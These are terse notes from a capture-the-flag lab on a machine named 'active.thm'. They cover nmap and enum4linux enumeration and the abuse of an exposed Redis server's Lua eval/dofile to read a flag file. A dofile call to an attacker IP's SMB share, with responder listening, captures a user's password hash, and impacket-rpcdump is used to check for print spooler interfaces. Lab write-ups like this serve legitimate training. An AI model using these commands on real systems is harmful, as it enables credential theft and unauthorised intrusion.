enum starting when you got machine

nmap -A -sC -sV -p-

redis-cli -h 
[active.thm:6379> eval "dofile('C:\\\\Users\\\\enterprise-security\\\\Desktop\\\\user.txt')" 0

Now, I set-up responder by running this:

responder -I tun0 -rdvw

Then ran this command on redis-cli:

eval "dofile('//10.9.1.100/share')" 0

(You can write anything in place of share, the share does not need to exist)
And we have got the userâ€™s pasword hash!]

enum4linux -a
           -ng -A 
           
impacket-rpcdump @active.thm

impacket-rpcdump @active.thm | egrep 'MS-RPRN|MS-PAR'
